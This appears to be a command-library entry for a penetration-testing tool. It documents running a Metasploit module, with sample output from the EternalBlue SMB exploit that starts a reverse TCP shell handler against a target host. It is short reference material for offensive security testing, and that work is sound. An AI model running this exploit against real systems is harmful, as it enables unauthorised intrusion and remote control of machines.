---
id: 76d76d82-1506-47f7-a0ed-4151763814a1
name: Metasploit Execute a Metasploit Module
type: command
executor: metasploit
data: exploit
output: "msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit\n\n[*] Started reverse\
  \ TCP handler on 10.0.1.100:4444 \n[*] 10.10.10.10:445 - Using auxiliary/scanner/smb/smb_ms17_010\
  \ as check"
created_at: '2020-07-08T22:56:24.137405+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Metasploit Execute a Metasploit Module

```metasploit
exploit
```

## Expected Output

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.0.1.100:4444 
[*] 10.10.10.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
```
